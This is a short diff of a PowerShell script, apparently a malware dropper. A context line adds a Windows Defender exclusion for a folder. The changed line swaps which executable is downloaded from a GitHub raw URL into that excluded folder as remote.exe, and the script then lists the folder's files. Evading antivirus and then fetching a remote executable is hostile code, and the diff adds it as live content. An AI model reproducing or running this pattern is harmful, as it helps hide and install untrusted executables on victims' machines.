@@ -15,7 +15,7 @@ Add-MpPreference -ExclusionPath $dir
 
 
 
-Invoke-WebRequest -Uri "https://raw.githubusercontent.com/43a1723/test/main/goood.exe" -OutFile "$dir\remote.exe"
+Invoke-WebRequest -Uri "https://raw.githubusercontent.com/43a1723/test/main/siuu.exe" -OutFile "$dir\remote.exe"
 
 Get-ChildItem -Path $dir | Where-Object { $_.PSIsContainer -eq $false } | ForEach-Object {
     Write-Output $_.FullName
